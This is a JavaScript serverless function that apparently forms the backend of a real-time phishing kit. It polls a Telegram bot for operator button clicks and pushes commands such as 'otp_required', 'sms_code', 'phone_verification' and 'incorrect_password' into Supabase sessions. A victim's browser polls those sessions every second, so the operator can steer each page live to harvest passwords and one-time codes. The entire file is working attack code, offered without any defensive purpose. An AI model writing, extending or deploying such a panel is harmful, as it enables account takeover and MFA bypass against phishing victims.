// poll-session.js
// Browser calls this every second. It does two things:
// 1. Asks Telegram for any new button clicks (getUpdates)
// 2. Returns the session status from Supabase

import { dbSelectOne, dbUpdate, dbUpsert } from './_supabase.js';

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;

const COMMAND_MAP = {
  otp:       'otp_required',
  sms:       'sms_code',
  phone:     'phone_verification',
  success:   'success',
  incorrect: 'incorrect_password',
  sua:       'sua',
};

// Offset stored in Supabase so it persists across function instances
const OFFSET_TABLE = 'telegram_offset';

export const handler = async (event) => {
  if (event.httpMethod !== 'GET') {
    return { statusCode: 405, body: 'Method not allowed' };
  }

  const sessionId = event.queryStringParameters?.sessionId;
  if (!sessionId) return ok({ status: 'waiting' });

  try {
    // Step 1: Fetch and process any pending Telegram button clicks
    await processTelegramUpdates();

    // Step 2: Read session status from Supabase
    const row = await dbSelectOne('sessions', { id: sessionId }, 'status,response_type,email');
    if (!row) return ok({ status: 'waiting' });

    return ok({
      status:       row.status,
      responseType: row.response_type,
      email:        row.email,
    });
  } catch (e) {
    console.error('poll-session error:', e.message);
    return ok({ status: 'waiting', error: e.message });
  }
};

async function processTelegramUpdates() {
  // Get current offset from Supabase
  const offsetRow = await dbSelectOne('telegram_offset', { id: 1 }, 'offset_value').catch(() => null);
  const offset    = offsetRow?.offset_value || 0;

  // Call Telegram getUpdates
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?limit=10&timeout=0&offset=${offset}&allowed_updates=["callback_query"]`;

  const r = await fetch(url, { signal: AbortSignal.timeout(5000) });
  if (!r.ok) {
    console.error('getUpdates failed:', r.status);
    return;
  }

  const data = await r.json();
  if (!data.ok || !data.result?.length) return;

  console.log(`Processing ${data.result.length} Telegram update(s)`);

  let maxUpdateId = offset - 1;

  for (const update of data.result) {
    maxUpdateId = Math.max(maxUpdateId, update.update_id);

    if (!update.callback_query) continue;

    const cb     = update.callback_query;
    const cbId   = cb.id;
    const cbData = cb.data || '';

    console.log('callback_query:', cbData);

    const match = cbData.match(/^([a-z]+)_([a-f0-9]{32})$/);
    if (!match) {
      console.error('Regex no match for:', cbData);
      continue;
    }

    const action       = match[1];
    const sessionId    = match[2];
    const responseType = COMMAND_MAP[action];

    if (!responseType) {
      console.error('Unknown action:', action);
      continue;
    }

    // Update session in Supabase
    await dbUpdate('sessions', {
      status:        'responded',
      response_type: responseType,
      responded_at:  new Date().toISOString(),
      last_update:   new Date().toISOString(),
    }, { id: sessionId });

    console.log(`Session ${sessionId} → ${responseType}`);

    // Acknowledge the button tap in Telegram
    await answerCallback(cbId, `✅ ${action.charAt(0).toUpperCase() + action.slice(1)} triggered!`);
  }

  // Advance offset so we don't process same updates again
  const newOffset = maxUpdateId + 1;
  try {
    await dbUpsert('telegram_offset', { id: 1, offset_value: newOffset });
  } catch (e) {
    console.error('CRITICAL: offset save failed — telegram_offset table may not exist:', e.message);
  }
}


async function answerCallback(cbId, text) {
  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
      method:  'POST',
      headers: { 'Content-Type': 'application/json' },
      body:    JSON.stringify({ callback_query_id: cbId, text }),
      signal:  AbortSignal.timeout(5000),
    });
  } catch (e) {
    console.error('answerCallback error:', e.message);
  }
}

const ok = (b) => ({
  statusCode: 200,
  headers:    { 'Content-Type': 'application/json' },
  body:       JSON.stringify(b),
});
